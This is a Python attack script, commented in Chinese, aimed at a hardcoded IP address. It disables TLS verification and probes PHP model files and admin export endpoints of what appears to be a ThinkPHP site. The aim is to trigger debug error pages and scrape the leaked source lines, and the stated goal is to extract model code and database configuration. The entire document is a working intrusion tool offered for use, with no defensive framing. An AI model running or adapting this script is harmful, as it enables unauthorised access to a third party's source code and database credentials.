#!/usr/bin/env python3
"""tp_model_src.py - 泄露Goods模型+Base模型源码, 找getExportGoods和DB配置"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=10, context=ctx)
        return r.status, r.read(250000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(250000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

all_lines = {}
print("=== 模型源码泄露尝试 ===", flush=True)

# Goods.php 继承 app\admin\model\Base -> 直接访问触发Base not found, 但可能带出Goods源码窗口
st, b = get(BASE + "/application/admin/model/Goods.php")
l = leak_lines(b)
print("Goods.php direct: %d lines" % len(l), flush=True)
all_lines.update(l)

# 通过Export触发Goods模型方法调用 -> 模型代码窗口
for url in ["/admin/export/goodslist.html?num=5&page=1",
            "/admin/goods/getList.html?num=5&page=1",
            "/admin/goods/goodsUpField.html?num=5&page=1",
            "/admin/export/goodslist.html?num=5&page=1&field=1"]:
    st, b = get(BASE + url)
    l = leak_lines(b)
    if l:
        new = {k: v for k, v in l.items() if k not in all_lines}
        if new:
            print("%s: +%d new lines" % (url.split("?")[0].split("/")[-1], len(new)), flush=True)
            all_lines.update(new)

# Base模型
st, b = get(BASE + "/application/admin/model/Base.php")
l = leak_lines(b)
if l:
    print("Base.php: %d lines" % len(l), flush=True)
    all_lines.update(l)

print("\n=== 汇总源码 ===", flush=True)
for ln in sorted(all_lines):
    print("  %4d: %s" % (ln, all_lines[ln][:130]), flush=True)
print("=== DONE ===", flush=True)
